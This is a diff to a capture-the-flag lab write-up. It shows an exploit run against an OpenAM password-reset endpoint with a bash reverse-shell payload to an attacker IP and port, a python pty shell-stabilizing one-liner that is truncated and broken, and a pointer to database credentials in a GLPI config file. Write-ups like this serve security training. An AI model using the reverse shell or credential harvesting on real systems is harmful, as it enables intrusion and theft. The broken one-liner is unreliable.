@@ -138,14 +138,18 @@ fire the exploit:
 python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'bash -c "bash -i >& /dev/tcp/10.10.16.87/9001 0>&1"'
 ```
 We get shell as user `openham`
-
+STABILIZE THE SHELL 
+```bash 
+python3 -c 'import pty;pty.spawn("/bi)'
+```
 ### Exploitation
 
 ```bash
 env
 ```
 exposes a config dir `PWD=/opt/glpi/config`
-
+under the 
+- `glpi` theres db creds, `config_db.php` capturing 
 
 Got a shell as `username`.
 
